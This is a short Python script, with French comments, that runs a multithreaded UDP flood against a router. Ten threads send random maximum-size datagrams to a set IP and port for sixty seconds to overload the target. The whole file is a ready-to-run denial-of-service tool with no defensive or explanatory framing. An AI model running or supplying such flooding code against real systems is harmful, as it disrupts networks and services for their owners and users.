import socket
import threading
import time
import os

TARGET_IP = "192.168.99.228"  # IP du routeur
TARGET_PORT = 5000            # N'importe quel port (UDP)
MESSAGE_SIZE = 1472           # Taille max pour rester dans MTU (1500 - 28)
THREAD_COUNT = 10             # Nombre de threads simultanés
DURATION = 60                 # Durée de l'attaque en secondes

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = os.urandom(MESSAGE_SIZE)
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            sock.sendto(message, (TARGET_IP, TARGET_PORT))
        except:
            pass
    sock.close()

if __name__ == "__main__":
    print(f"[+] Lancement de {THREAD_COUNT} threads de flood UDP vers {TARGET_IP}:{TARGET_PORT} pendant {DURATION}s")
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[✓] Surcharge terminée.")
